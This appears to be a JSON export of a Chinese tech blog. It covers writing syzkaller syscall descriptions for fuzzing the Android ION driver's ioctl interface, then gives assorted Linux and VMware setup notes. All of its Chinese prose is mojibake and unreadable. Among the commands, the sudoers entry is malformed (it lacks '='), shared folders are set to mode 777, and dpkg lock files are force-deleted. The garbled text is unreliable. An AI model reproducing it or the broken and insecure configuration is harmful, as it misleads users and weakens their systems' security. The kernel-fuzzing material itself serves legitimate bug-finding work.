gccä¸‹è½½åœ°å€ï¼š[gccä¸‹è½½](http://ftp.gnu.org/gnu/gcc/)\n\nå®¿ä¸»æœºè‡ªå¸¦çš„gccç‰ˆæœ¬è¿‡ä½çš„è¯ï¼Œéœ€è¦åœ¨åŸæœ¬çš„åŸºç¡€ä¸Šæ–°è£…ä¸€ä¸ªé«˜ç‰ˆæœ¬çš„gccã€‚è¿™é‡Œæˆ‘é€‰æ‹©æºç å®‰è£…ï¼Œå¹¶ä¸”å°†å®ƒå®‰è£…åˆ°ä¸€ä¸ªå•ç‹¬ç›®å½•ï¼Œè¿™æ ·ä»Šåæƒ³å¸è½½çš„è¯ï¼Œç›´æ¥åˆ é™¤è¯¥ç›®å½•å³å¯ã€‚\n\n- è§£å‹gcc-7.4.0æºç åŒ…ï¼š`tar -zxvf gcc-7.4.0.tar.gz`ï¼ˆæˆ–è€…`tar -Jxvf gcc-7.4.0.tar.xz`ï¼‰\n- ä¸‹è½½å®‰è£…ä¾èµ–é¡¹ï¼šåœ¨è§£å‹å®Œçš„æºç åŒ…ä¸­ï¼Œæ‰§è¡Œ./contrib/download_prerequisitesï¼ˆéœ€æ›´æ”¹base_urlä¸ºhttp://mirror.linux-ia64.org/gnu/gcc/infrastructure/ï¼Œå¦‚æœæ‰§è¡Œæ—¶ä¸€ç›´æ²¡æœ‰è¿›åº¦ï¼Œè€ƒè™‘åŠ ä¸Šsudoæƒé™æ‰§è¡Œï¼‰ã€‚è‹¥æ‰§è¡Œä¸æˆåŠŸï¼Œåˆ™éœ€è‡ªè¡Œä¸‹è½½å®‰è£…ï¼Œæ­¥éª¤å¦‚ä¸‹ã€‚\n\n```\ngcc7.4.0ä¾èµ–çš„gmp,mpfrå’Œmpcç‰ˆæœ¬å¦‚ä¸‹ï¼š\n\tgmp='gmp-6.1.0.tar.bz2'\n\tmpfr='mpfr-3.1.4.tar.bz2'\n\tmpc='mpc-1.0.3.tar.gz'\n\nå®‰è£…è¿‡ç¨‹å‚è€ƒé“¾æ¥ï¼š\nhttps://blog.csdn.net/lwbeyond/article/details/77718040ï¼ˆä¸»è¦å‚è€ƒè¯¥æ–‡æ¡£ï¼‰\nhttps://blog.csdn.net/xs1102/article/details/89175293\nhttps://blog.csdn.net/davidhopper/article/details/79681695\n\nå®‰è£…gmpåˆ°configureæ­¥éª¤æ—¶ï¼Œå‡ºç°â€œno usable m4â€é”™è¯¯ï¼š\nhttps://blog.csdn.net/wangqing_12345/article/details/52484723\n```\n\n\n\n## 2 txtæ–‡ä»¶è¯­æ³•\n\nä»¥ioctlä¸ºä¾‹ï¼Œç”¨æˆ·æ€è°ƒç”¨è§„åˆ™ï¼š\n\n```\nint (*ioctl) (struct inode *inode,struct file *filp,unsigned int cmd,unsigned long arg);\n/*\ninodeä¸filpä¸¤ä¸ªæŒ‡é’ˆå¯¹åº”äºåº”ç”¨ç¨‹åºä¼ é€’çš„æ–‡ä»¶æè¿°ç¬¦fdï¼Œè¿™å’Œä¼ é€’openæ–¹æ³•çš„å‚æ•°ä¸€æ ·ã€‚\ncmd ç”±ç”¨æˆ·ç©ºé—´ç›´æ¥ä¸ç»ä¿®æ”¹çš„ä¼ é€’ç»™é©±åŠ¨ç¨‹åº\narg å¯é€‰ã€‚\n*/\n```\n\nå®šåˆ¶è¿‡ç¨‹ï¼š\n\n1ã€ åˆ†æç›®æ ‡é©±åŠ¨çš„ioctlå‡½æ•°å®ç°ã€‚ 2ã€ æ‰¾åˆ°æ¯ä¸ªcmdå¯¹åº”çš„ä»£ç å—ï¼Œåˆ†æargçš„è§£æè¿‡ç¨‹ï¼ˆç»“æ„ä½“ï¼‰ã€‚ 3ã€ æŠŠæ‰€æœ‰è¿™ç±»ç»“æ„ä½“ï¼ŒæŒ‰ç…§ syzkaller çš„è§„åˆ™å†™æˆç±»ä¼¼goè¯­è¨€çš„ç»“æ„ä½“å®šä¹‰ã€‚ç»“æ„ä½“ä¸­å¦‚æœåŒ…å«äº†å…¶ä»–ç»“æ„ä½“ï¼Œä¹Ÿéƒ½è¦å†™ä¸Š ã€‚ 4ã€ æ¯ä¸ªcmdç éƒ½å†™æˆä¸€ä¸ªioctlç³»ç»Ÿè°ƒç”¨ï¼Œä»¥ä¸Šé¢çš„ç»“æ„ä½“ä¸ºå‚æ•°ã€‚å¦‚ï¼š\n\n```\nstatic long ion_ioctl(struct file *filp, unsigned int cmd, unsigned long arg)\n{\n\tstruct ion_client *client = filp->private_data;\n\tstruct ion_device *dev = client->dev;\n\tstruct ion_handle *cleanup_handle = NULL;\n\tint ret = 0;\n\tunsigned int dir;\n\n\tunion {\n\t\tstruct ion_fd_data fd;\n\t\tstruct ion_allocation_data allocation;\n\t\tstruct ion_handle_data handle;\n\t\tstruct ion_custom_data custom;\n\t} data;\n\n\tdir = ion_ioctl_dir(cmd);\n\n\tif (_IOC_SIZE(cmd) > sizeof(data))\n\t\treturn -EINVAL;\n\n\tif (dir & _IOC_WRITE)\n\t\tif (copy_from_user(&data, (void __user *)arg, _IOC_SIZE(cmd)))\n\t\t\treturn -EFAULT;\n\n\tswitch (cmd) {\n\tcase ION_IOC_ALLOC:\n\t{\n\t\tstruct ion_handle *handle;\n\n\t\thandle = ion_alloc(client, data.allocation.len,\n\t\t\t\t\t\tdata.allocation.align,\n\t\t\t\t\t\tdata.allocation.heap_id_mask,\n\t\t\t\t\t\tdata.allocation.flags);\n\t\tif (IS_ERR(handle))\n\t\t\treturn PTR_ERR(handle);\n\n\t\tdata.allocation.handle = handle->id;\n\n\t\tcleanup_handle = handle;\n\t\tbreak;\n\t}\n\tcase ION_IOC_FREE:\n\t{\n\t\tstruct ion_handle *handle;\n\n\t\thandle = ion_handle_get_by_id(client, data.handle.handle);\n\t\tif (IS_ERR(handle))\n\t\t\treturn PTR_ERR(handle);\n\t\tion_free(client, handle);\n\t\tion_handle_put(handle);\n\t\tbreak;\n\t}\n\tcase ION_IOC_SHARE:\n\tcase ION_IOC_MAP:\n\t{\n\t\tstruct ion_handle *handle;\n\n\t\thandle = ion_handle_get_by_id(client, data.handle.handle);\n\t\tif (IS_ERR(handle))\n\t\t\treturn PTR_ERR(handle);\n\t\tdata.fd.fd = ion_share_dma_buf_fd(client, handle);\n\t\tion_handle_put(handle);\n\t\tif (data.fd.fd < 0)\n\t\t\tret = data.fd.fd;\n\t\tbreak;\n\t}\n\tcase ION_IOC_IMPORT:\n\t{\n\t\tstruct ion_handle *handle;\n\n\t\thandle = ion_import_dma_buf(client, data.fd.fd);\n\t\tif (IS_ERR(handle))\n\t\t\tret = PTR_ERR(handle);\n\t\telse\n\t\t\tdata.handle.handle = handle->id;\n\t\tbreak;\n\t}\n\tcase ION_IOC_SYNC:\n\t{\n\t\tret = ion_sync_for_device(client, data.fd.fd);\n\t\tbreak;\n\t}\n\tcase ION_IOC_CUSTOM:\n\t{\n\t\tif (!dev->custom_ioctl)\n\t\t\treturn -ENOTTY;\n\t\tret = dev->custom_ioctl(client, data.custom.cmd,\n\t\t\t\t\t\tdata.custom.arg);\n\t\tbreak;\n\t}\n\tdefault:\n\t\treturn -ENOTTY;\n\t}\n\n\tif (dir & _IOC_READ) {\n\t\tif (copy_to_user((void __user *)arg, &data, _IOC_SIZE(cmd))) {\n\t\t\tif (cleanup_handle)\n\t\t\t\tion_free(client, cleanup_handle);\n\t\t\treturn -EFAULT;\n\t\t}\n\t}\n\treturn ret;\n}\n```\n\nå¯¹åº”å®šåˆ¶çš„txtï¼š\n\n```\ninclude <asm/ioctl.h>\ninclude <linux/fcntl.h>\ninclude <../drivers/staging/android/uapi/ion.h>\n\nresource fd_ion[fd]\nresource fd_ion_generic[fd]\n\nresource ion_handle[int32]\n\nopenat$ion(fd const[AT_FDCWD], file ptr[in, string[\"/dev/ion\"]], flags flags[open_flags], mode const[0]) fd_ion\nioctl$ION_IOC_ALLOC(fd fd_ion, cmd const[ION_IOC_ALLOC], arg ptr[inout, ion_allocation_data])\nioctl$ION_IOC_FREE(fd fd_ion, cmd const[ION_IOC_FREE], arg ptr[in, ion_handle_data])\nioctl$ION_IOC_MAP(fd fd_ion, cmd const[ION_IOC_MAP], arg ptr[inout, ion_fd_data])\nioctl$ION_IOC_SHARE(fd fd_ion, cmd const[ION_IOC_SHARE], arg ptr[inout, ion_fd_data])\nioctl$ION_IOC_IMPORT(fd fd_ion, cmd const[ION_IOC_IMPORT], arg ptr[inout, ion_fd_data])\nioctl$ION_IOC_SYNC(fd fd_ion, cmd const[ION_IOC_SYNC], arg ptr[inout, ion_fd_data])\nioctl$ION_IOC_CUSTOM(fd fd_ion, cmd const[ION_IOC_CUSTOM], arg ptr[inout, ion_custom_data])\n\nion_allocation_data {\n\tlen\tintptr\n\talign\tintptr\n\theapid\tint32\n\tflags\tint32\n\thandle\tion_handle\n}\n\nion_handle_data {\n\thandle\tion_handle\n}\n\nion_fd_data {\n\thandle\tion_handle\n\tfd\tfd_ion_generic\n}\n\nion_custom_data {\n\tcmd\tint32\n\targ\tintptr\n}\n```\n\n\n\n\n\n# å‚è€ƒæ–‡ç« æ¨è\n\n[å†…æ ¸æ¼æ´æŒ–æ˜æŠ€æœ¯ç³»åˆ—(4)â€”â€”syzkaller(1)](https://xz.aliyun.com/t/5079?spm=5176.12901015.0.i12901015.3af8525coJ6I6t)\n\n[ã€æ¼æ´æŒ–æ˜ã€‘ä½¿ç”¨Syzkaller&QEMUæ•æ‰å†…æ ¸å †æº¢å‡ºDemo](https://www.jianshu.com/p/790b733f80a2)\n\n[Syzkaller Crash Demo](http://pwn4.fun/2019/10/09/Syzkaller-Crash-Demo/)\n\n[ä»0åˆ°1å¼€å§‹ä½¿ç”¨syzkallerè¿›è¡ŒLinuxå†…æ ¸æ¼æ´æŒ–æ˜ ](https://bbs.pediy.com/thread-265405.htm#ç¯å¢ƒæ­å»ºè¿‡ç¨‹ï¼ˆåè¡€è¸©å‘ï¼‰)\n\n[Using syzkaller, part 1: Fuzzing the Linux kernel](https://www.collabora.com/news-and-blog/blog/2020/03/26/syzkaller-fuzzing-the-kernel/)\n\n[Using syzkaller, part 2: Detecting programming bugs in the Linux kernel](https://www.collabora.com/news-and-blog/blog/2020/04/17/using-syzkaller-to-detect-programming-bugs-in-linux/)\n\n[Linux Kernel Pwn IIIï¼šä½¿ç”¨ syzkaller è¿›è¡Œæ¼æ´æŒ–æ˜](https://arttnba3.cn/2021/11/24/NOTE-0X06-LINUX-KERNEL-PWN-PART-III/)\n\n[Highlighting syzkaller descriptions syntax with Rouge](https://xairy.io/articles/2021/syzkaller-syntax-highlight)\n\n\n\n","categories":["Fuzzing"]},{"title":"linux releated","url":"/2019/01/01/linux-releated/","content":"\n# è§£å†³ubuntuä¸­\"Could not get lock /var/lib/dpkg/lock\"\n\n[How to Fix â€˜E: Could not get lock /var/lib/dpkg/lockâ€™ Error in Ubuntu Linux](https://itsfoss.com/could-not-get-lock-error/)\n\n[How To Fix \"Could not get lock /var/lib/dpkg/lock - open (11 Resource temporarily unavailable)\" Errors](https://www.linuxuprising.com/2018/07/how-to-fix-could-not-get-lock.html)\n\næ¯”è¾ƒæš´åŠ›çš„æ–¹æ³•æ˜¯ï¼Œç›´æ¥rm -rf é‚£ä¸¤ä¸ªlockæ–‡ä»¶\n\n# Kali 2020ç‰ˆä¸­æ–‡æ˜¾ç¤ºä¹±ç çš„è§£å†³æ–¹æ¡ˆ\n\nå®‰è£…å®Œ2020æœ€æ–°kaliä¸­æ–‡ç‰ˆåï¼Œå‘ç°ç•Œé¢å‡ºç°äº†æ— æ•°â€œéº»å°†å—â€ã€‚åŸå› æ˜¯è¯¥ç‰ˆæœ¬å¯¹ä¸­æ–‡çš„ä¸æ”¯æŒï¼Œå› æ­¤éœ€è¦æˆ‘ä»¬è‡ªå·±å®‰è£…ä¸€ä¸‹ä¸­æ–‡å­—ä½“ã€‚\n\n## æ›´æ”¹kaliçš„é•œåƒæº\n\nåœ¨sources.listä¸­æ·»åŠ ä¸€ä¸ªæºï¼š\n\n```shell\nvim /etc/apt/sources.list\n\n# tsinghua university\ndeb https://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-free\ndeb-src https://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-free\n\n```\n\næ·»åŠ å®Œæºä¹‹åï¼Œå¿…é¡»ç«‹é©¬æ‰§è¡Œæ›´æ–°å‘½ä»¤ï¼š\n\n```shell\nsudo apt-get update\n```\n\n## å®‰è£…ä¸­æ–‡å­—ä½“\n\nä¾æ¬¡æ‰§è¡Œä»¥ä¸‹å‘½ä»¤ï¼š\n\n```shell\n# å®‰è£…æœ¬åœ°è®¾ç½®\nsudo apt-get install locales\nlocale -a\n# å®‰è£…ä¸­æ–‡å­—ä½“\nsudo apt-get install xfonts-intl-chinese\nsudo apt-get install ttf-wqy-microhei\n#é‡å¯kali\nsudo reboot\n```\n\nå‚è€ƒäº†å¦‚ä¸‹å‡ ç¯‡æ–‡ç« çš„æ–¹æ³•ï¼š\n\n[2019kaliä¸­æ–‡ä¹±ç ](https://www.cnblogs.com/ainv-123/p/12158303.html)\n\n[è§£å†³å®‰è£…kali 2020.1ç‰ˆæœ¬åçš„ä¸­æ–‡ä¹±ç é—®é¢˜](https://blog.csdn.net/weixin_45604567/article/details/104156673)\n\n[ä»€ä¹ˆæ˜¯localeï¼Ÿ](https://wiki.ubuntu.org.cn/Locale)\n\n\n\n# ubuntu 1804 å®‰è£…æœç‹—è¾“å…¥æ³•\n\nåœ¨å®˜ç½‘ä¸‹è½½linuxç‰ˆæœç‹—è¾“å…¥æ³•çš„debå®‰è£…åŒ…ï¼Œä¸‹è½½åˆ°æœ¬åœ°åï¼Œæ‰§è¡Œä»¥ä¸‹ä¸‰æ¡å‘½ä»¤\n\n```shell\nsudo dpkg -i sogoupinyin_2.3.1.0112_amd64.deb\nsudo apt --fix-broken install\nsudo dpkg -i sogoupinyin_2.3.1.0112_amd64.deb\n```\n\nåœ¨settings -> Region& Language -> Manage Installed Languagesä¸­æŠŠKeyboard input method systemä»IBusä¿®æ”¹ä¸ºfcitxã€‚ç„¶åç‚¹å‡»Apply System Wideã€‚æœ€åé‡å¯ç”µè„‘ã€‚\n\né‡å¯å®Œæˆåï¼Œåœ¨ç³»ç»Ÿä¸­æœç´¢fcitx configurationï¼Œç‚¹å‡»å·¦ä¸‹è§’çš„åŠ å·ï¼Œå–æ¶ˆå‹¾é€‰Only Show Current Languageï¼Œç„¶åé€‰æ‹©Sougou Pinyinï¼ŒOKä¸€ä¸‹å°±å¯ä»¥äº†ã€‚\n\nç°åœ¨å°±å¯ä»¥é€šè¿‡ctrl+shiftåˆ‡æ¢è¾“å…¥æ³•ï¼\n\n# Linuxä¸Šå®‰è£…sambaæœåŠ¡\n\n## ubuntuç¯å¢ƒ\n\nï¼ˆ1ï¼‰å®‰è£…smbæœåŠ¡\n\n```shell\nsudo apt update\nsudo apt install samba\nwhereis samba\n```\n\nï¼ˆ2ï¼‰æŒ‡å®šå…±äº«æ–‡ä»¶å¤¹\n\n```shell\nsudo vim /etc/samba/smb.conf\n\t[sambashare]\n    \t\tcomment = Samba on Ubuntu\n    \t\tpath = /any/folder/\n    \t\tread only = no\n    \t\tbrowsable = yes\nsudo service smbd restart\nsudo ufw allow samba ï¼ˆpsï¼šå¦‚æœæ²¡æœ‰é˜²ç«å¢™æˆ–è€…é˜²ç«å¢™æœªå¼€å¯ï¼Œè¿™ä¸€æ­¥å¯çœç•¥ï¼‰\n```\n\nï¼ˆæ³¨æ„ï¼š /any/folder/éœ€è¦å°†folderæƒé™è®¾ç½®ä¸º777ï¼Œè¿™æ ·æ‰èƒ½æ­£å¸¸è®¿é—®ï¼‰\n\nï¼ˆ3ï¼‰æŒ‡å®šè®¿é—®ç”¨æˆ·\n\n```shell\nsudo smbpasswd -a username\n```\n\nusernameæ˜¯ubuntuä¸Šçš„ä¸€ä¸ªæ™®é€šç”¨æˆ·ã€‚\n\nï¼ˆ4ï¼‰windowsä¸Šè®¿é—®\n\n```shell\n//ubuntu-ip/sambashare\n```\n\nwindowsè®¿é—®å¦‚ä¸Šåœ°å€å°±å¯ä»¥è¿›å…¥åˆ°/any/folder/ç›®å½•äº†ï¼\n\n## redhatç¯å¢ƒ\n\nå‚è€ƒï¼š\n\n[ubuntuä¸Šè®¾ç½®sambaæœåŠ¡](https://ubuntu.com/tutorials/install-and-configure-samba#1-overview)\n\n[redhatä¸Šè®¾ç½®sambaæœåŠ¡](https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/7/html/selinux_users_and_administrators_guide/sect-managing_confined_services-samba-configuration_examples)\n\n\n\n# Linuxä¸Šæ·»åŠ /åˆ é™¤ç”¨æˆ·\n\nubuntuæ·»åŠ æ–°ç”¨æˆ·ï¼š\n\n```shell\nadduser bling\n```\n\nå°†ç”¨æˆ·æ·»åŠ åˆ°rootç»„\n\n```shell\nsudo chmod u+w /etc/sudoers\nsudo vim /etc/sudoers\n\tåœ¨rootä¸‹æ–¹æ·»åŠ ï¼šbling ALL(ALL:ALL) ALL\nsudo chmod u-w /etc/sudoers\n```\n\nåˆ é™¤ç”¨æˆ·ï¼š\n\n```shell\ndeluser bling\n```\n\n# Linuxä¸Šå®‰è£…java jdk\n\nè¿™é‡Œä»¥openjdkä¸ºä¾‹ï¼Œå¦‚æœéœ€è¦å®‰è£…oracle Java JDKï¼Œè¯·ç”¨å‚è€ƒé“¾æ¥ä¸­çš„æ–¹å¼ã€‚\n\n```shell\n# æ›´æ–°è½¯ä»¶åŒ…åˆ—è¡¨\nsudo apt-get update\n# å®‰è£…openjdk-8-jdk\nsudo apt-get install openjdk-8-jdk\n# æŸ¥çœ‹javaç‰ˆæœ¬ï¼ŒéªŒè¯æ˜¯å¦å®‰è£…æˆåŠŸ\njava -version\n```\n\nå‚è€ƒï¼š\n\n[Ubuntu 18.04å®‰è£…Java JDK8ä¸‰ç§æ–¹å¼](https://blog.csdn.net/zbj18314469395/article/details/86064849)\n\n# Linuxä¸Šå‡çº§python\n\n## ppaæºå‡çº§\n\n- æ·»åŠ ppaæºï¼Œå®‰è£…python 3.6\n\n```shell\nsudo add-apt-repository ppa:jonathonf/python-3.6\nsudo apt-get update\nsudo apt-get install python3.6\n```\n\n- è°ƒæ•´python3çš„ä¼˜å…ˆçº§çš„æ–¹æ³•è§5.2\n\n## æºç å‡çº§\n\n- å»å®˜ç½‘ä¸‹è½½æ‰€éœ€ç‰ˆæœ¬çš„pythonæºç åŒ…ã€‚\n\n[pythonæºç ç½‘å€](https://www.python.org/ftp/python/)\n\n- å®‰è£…ä¾èµ–\n\n```shell\nsudo apt-get install gcc make zlib1g-dev\nsudo apt-get install libbz2-dev\nsudo apt-get install libsqlite3-dev\nsudo apt-get install python3-dev libxml2-dev libffi-dev libssl-dev libxslt1-dev\n```\n\n- å¼€å§‹å®‰è£…\n\n```shell\ntar -zxvf Python-3.6.7.tgz\nsudo mv Python-3.6.7 /usr/local\ncd /usr/local/Python-3.6.7\n./configure\nsudo make\nsudo make install\n```\n\n- æ›´æ”¹pythonç‰ˆæœ¬ä¼˜å…ˆçº§\n\næŸ¥è¯¢pythonå®‰è£…è·¯å¾„ï¼š`whereis python`\n\nè°ƒæ•´ä¼˜å…ˆçº§ï¼Œå°†æ–°å®‰è£…çš„3.6è°ƒåˆ°æœ€å¤§ï¼š\n\n```shell\nsudo update-alternatives --install /usr/bin/python python /usr/bin/python2.7 100\nsudo update-alternatives --install /usr/bin/python python /usr/local/bin/python3.6 200\nsudo update-alternatives --install /usr/bin/python python /usr/bin/python3.5 150\n```\n\nåˆ°è¿™ä¸€æ­¥å°±ç®—æ˜¯ç»“æŸäº†ï¼Œæ­¤æ—¶ä½¿ç”¨`python --version`å¯ä»¥çœ‹åˆ°pythonå·²ç»æ˜¯3.6ç‰ˆæœ¬çš„äº†ã€‚\n\n- åç»­è®¾ç½®å˜æ›´\n\n```shell\n# æŸ¥è¯¢å¯é…ç½®çš„python\nupdate-alternatives --list python\n# åˆ‡æ¢é»˜è®¤pythonç‰ˆæœ¬\nupdate-alternatives --config python\n```\n\nå‚è€ƒï¼š\n\n[Ubuntu 16.04 å‡çº§Pythonç‰ˆæœ¬åˆ°3.6](https://www.jianshu.com/p/738f08dfe1f8)\n\n[Ubuntu 16.04 æºç å®‰è£…Python-3.6.7](https://www.jianshu.com/p/43e0e25bc0d0)\n\n[linuxä¸­å®‰è£…Thriftï¼ˆæŒ‡å®šç‰ˆæœ¬ï¼‰](https://blog.csdn.net/xc_zhou/article/details/82593854)\n\n\n\n# Linuxä¸‹ç”Ÿæˆ/åº”ç”¨patch\n\n## æ™®é€špatch\n\n1. ä¸ºå•ä¸ªæ–‡ä»¶ç”Ÿæˆpatch\n\n   `diff -up /oldFilePath /newFilePath > file.patch`\n\n   å‚æ•°è¯´æ˜:\n\n   -u æ˜¾ç¤ºæœ‰å·®å¼‚è¡Œçš„å‰åå‡ è¡Œ(ä¸Šä¸‹æ–‡), é»˜è®¤æ˜¯å‰åå„3è¡Œ, è¿™æ ·, patchä¸­å¸¦æœ‰æ›´å¤šçš„ä¿¡æ¯.\n\n   -p æ˜¾ç¤ºä»£ç æ‰€åœ¨çš„cå‡½æ•°çš„ä¿¡æ¯.\n\n2. ä¸ºå¤šä¸ªæ–‡ä»¶ç”Ÿæˆpatch `diff -uprN /oldFolderPath /newFolderPath > folder.patch`\n\n   å‚æ•°è¯´æ˜:\n\n   -r é€’å½’åœ°å¯¹æ¯”ä¸€ä¸ªç›®å½•å’Œå®ƒçš„æ‰€æœ‰å­ç›®å½•(å³æ•´ä¸ªç›®å½•æ ‘).\n\n   -N å¦‚æœæŸä¸ªæ–‡ä»¶ç¼ºå°‘äº†, å°±å½“ä½œæ˜¯ç©ºæ–‡ä»¶æ¥å¯¹æ¯”. å¦‚æœä¸ä½¿ç”¨æœ¬é€‰é¡¹, å½“diffå‘ç°æ—§ä»£ç æˆ–è€…æ–°ä»£ç ç¼ºå°‘æ–‡ä»¶æ—¶, åªç®€å•çš„æç¤ºç¼ºå°‘æ–‡ä»¶. å¦‚æœä½¿ç”¨æœ¬é€‰é¡¹, ä¼šå°†æ–°æ·»åŠ çš„æ–‡ä»¶å…¨æ–°æ‰“å°å‡ºæ¥ä½œä¸ºæ–°å¢çš„éƒ¨åˆ†.\n\n3. linuxæ‰“è¡¥ä¸\n\n   `patch -p1 < demo.patch`\n\n   ç”Ÿæˆçš„è¡¥ä¸ä¸­, è·¯å¾„ä¿¡æ¯åŒ…å«äº†ä½ çš„Linuxæºç æ ¹ç›®å½•çš„åç§°, ä½†å…¶ä»–äººçš„æºç æ ¹ç›®å½•å¯èƒ½æ˜¯å…¶å®ƒåå­—, æ‰€ä»¥, æ‰“è¡¥ä¸æ—¶, è¦è¿›å…¥ä½ çš„Linuxæºç æ ¹ç›®å½•, å¹¶ä¸”å‘Šè¯‰patchå·¥å…·, è¯·å¿½ç•¥è¡¥ä¸ä¸­çš„è·¯å¾„çš„ç¬¬ä¸€çº§ç›®å½•(å‚æ•°-p1).\n\n   diffå‘½ä»¤å¿…é¡»åœ¨æ•´ä¸ªLinuxæºç çš„æ ¹ç›®å½•çš„ä¸Šä¸€çº§ç›®å½•ä¸­æ‰§è¡Œ.\n\n4. solarisæ‰“è¡¥ä¸\n\n   `gpatch -p1 < demo.patch`\n\nä¾‹å¦‚ï¼š\n\n```\npatch -p1 < huawei_patch/huawei_tf_gic_0001.patch\npatch -p1 < huawei_patch/huawei_tf_gic_0002.patch\n```\n\n## git patch\n\nhttps://juejin.im/post/5b5851976fb9a04f844ad0f4\n\n# ssh\n\nå®‰è£…å‘½ä»¤ï¼š\n\n```shell\n# å®¢æˆ·ç«¯\nsudo apt-get install ssh  æˆ–è€… sudo apt-get installopenssh-client\n# æœåŠ¡ç«¯\nsudo apt-get install openssh-server\n```\n\nsshæœåŠ¡å‘½ä»¤ï¼š\n\n```shell\nsudo/etc/init.d/ssh start\nsudo/etc/init.d/ssh restart\nsudo/etc/init.d/ssh stop\n```\n\né…ç½®æ–‡ä»¶ï¼š\n\n```shell\n# æ›´æ”¹sshé…ç½®æ–‡ä»¶å‰æœ€å¥½å…ˆå¤‡ä»½ä¸€ä¸ª\nsudo cp/etc/ssh/sshd_config /etc/ssh/sshd_config.original\n# å¯ä»¥åœ¨å¦‚ä¸‹é…ç½®æ–‡ä»¶ä¸­ä¿®æ”¹Portç«¯å£å·ï¼ˆé»˜è®¤æ˜¯22ï¼‰ï¼ŒPermitRootLoginç­‰\nvim /etc/ssh/sshd_config\n```\n\nç”Ÿæˆssh keyå…å¯†ç™»å½•ï¼š\n\n```shell\n# åœ¨å®¢æˆ·ç«¯ç”Ÿæˆç”¨äºç™»å½•çš„å…¬ç§é’¥ï¼Œç”Ÿæˆåä½äº~/.ssh/ç›®å½•ä¸‹\nssh-keygen -t rsa -b 4096 -C \"xxx@mail.com\"\n# å°†å…¬é’¥æ‹·è´åˆ°è¿œç«¯æœåŠ¡å™¨çš„~/.ssh/ç›®å½•ä¸‹ï¼Œå¹¶é‡å‘½åä¸ºauthorized_keys\nscp ~/.ssh/id_rsa.pub user@ip:~/.ssh/authorized_keys\n```\n\nå‚è€ƒï¼š\n\n[Generating a new SSH key and adding it to the ssh-agent](https://help.github.com/en/github/authenticating-to-github/generating-a-new-ssh-key-and-adding-it-to-the-ssh-agent)\n\n\n\n\n# ubuntuè®¾ç½®é™æ€ip\n\n1ã€æ›´æ”¹interfacesæ–‡ä»¶ä¸­çš„å†…å®¹\n\n```shell\nsudo vim /etc/network/interfaces\n\nauto enp0s8\niface enp0s8 inet static\naddress 192.168.56.116\nnetmask 255.255.255.0\ngateway 192.168.56.1\n```\n\n2ã€åˆ·æ–°ip\n\n```shell\nsudo ip addr flush enp0s8\nsudo systemctl restart networking.service\n```\n\n3ã€è®¾ç½®é‡å¯åä¾ç„¶ç”Ÿæ•ˆ\n\n```shell\nsudo vim /etc/NetworkManager/NetworkManager.conf\n# å°†NetworkManager.confä¸­managed=falseæ”¹ä¸ºmanaged=true\nsudo service network-manager restart\n```\n\nå‚è€ƒæ–‡ç« å¦‚ä¸‹ï¼š\n\n[ubuntu 16.04 è®¾ç½®é™æ€IP](https://www.jianshu.com/p/d69a95aa1ed7)\n","tags":["linux"],"categories":["Others"]},{"title":"windows releated","url":"/2019/01/01/windows-releated/","content":"\n# è™šæ‹Ÿæœºç›¸å…³\n\n## vmware\n\n### å®‰è£…vmware-tools\n\n- ç‚¹å‡»èœå•æ ä¸­â€œè™šæ‹Ÿæœºâ€ --> â€œå®‰è£…vmware toolsâ€\n- æ­¤æ—¶è™šæ‹Ÿæœºä¸­ä¼šæœ‰ä¸€ä¸ªCD driver\n- ç‚¹å‡»CD driverï¼Œå°†å…¶ä¸­çš„VMware taråŒ…æ‹·è´åˆ°æœ¬åœ°ç›®å½•\n- è§£taråŒ…\n- è¿›è§£å¼€çš„taråŒ…ç›®å½•ï¼Œç”¨sudoæ‰§è¡Œvmware-xxx.plæ–‡ä»¶å®‰è£…å³å¯\n\n### å®‰è£…open-vm-tools\n\n```shell\nsudo apt update\nsudo apt install open-vm-tools\n//æ¡Œé¢ç‰ˆè¿˜éœ€å®‰è£…å¦‚ä¸‹åŒ…ï¼Œä»¥æ”¯æŒåŒå‘æ‹–æ‹½æ–‡ä»¶\nsudo apt install open-vm-tools-desktop\n```\n\nå…±äº«æ–‡ä»¶å¤¹ï¼š\n\n- åœ¨çº¿æ–¹å¼\n\n```\n//è™šæ‹Ÿæœºå¼€æœºçš„æƒ…å†µä¸‹ï¼Œåœ¨â€œè™šæ‹Ÿæœºâ€-->â€œè®¾ç½®â€-->â€œé€‰é¡¹â€ä¸­è®¾ç½®å¥½å…±äº«æ–‡ä»¶å¤¹\n//ä¾¿å¯ä»¥åœ¨/mnt/hgfs/xxxå…±äº«ç›®å½•è®¿é—®äº†\n//å¦‚æœè¿™æ ·ä¸å¯è®¿é—®çš„è¯ï¼Œå°±å‚ç…§ç¦»çº¿æ–¹å¼çš„å‘½ä»¤æ‰§è¡Œä¸€é\n```\n\n- ç¦»çº¿æ–¹å¼\n\n```shell\n//å…ˆå°†è™šæ‹Ÿæœºå…³æœºï¼Œåœ¨â€œè™šæ‹Ÿæœºâ€-->â€œè®¾ç½®â€-->â€œé€‰é¡¹â€ä¸­è®¾ç½®å¥½å…±äº«æ–‡ä»¶å¤¹\n//ä½¿ç”¨å¦‚ä¸‹å‘½ä»¤å¯ä»¥æŸ¥çœ‹å…±äº«ç›®å½•è®¾ç½®æ˜¯å¦æˆåŠŸ\nvmware-hgfsclient\n//å†è¿›å…¥è™šæ‹Ÿæœºä¸­\nmkdir /mnt/hgfs\ncd /mnt\nsudo chmod 777 ./hgfs\nsudo chown bling:bling hgfs -R\nvmhgfs-fuse .host:/ /mnt/hgfs\n```\n\n### é˜²ç«å¢™è®¾ç½®\n\næ·»åŠ ä¸€æ¡é˜²ç«å¢™è§„åˆ™ï¼Œå¦‚æ­¤vmwareè™šæ‹Ÿæœºå†…æ‰èƒ½pingé€š/è®¿é—®hostç½‘ç»œã€‚\n\n[windowsé˜²ç«å¢™ æ–°åŠ 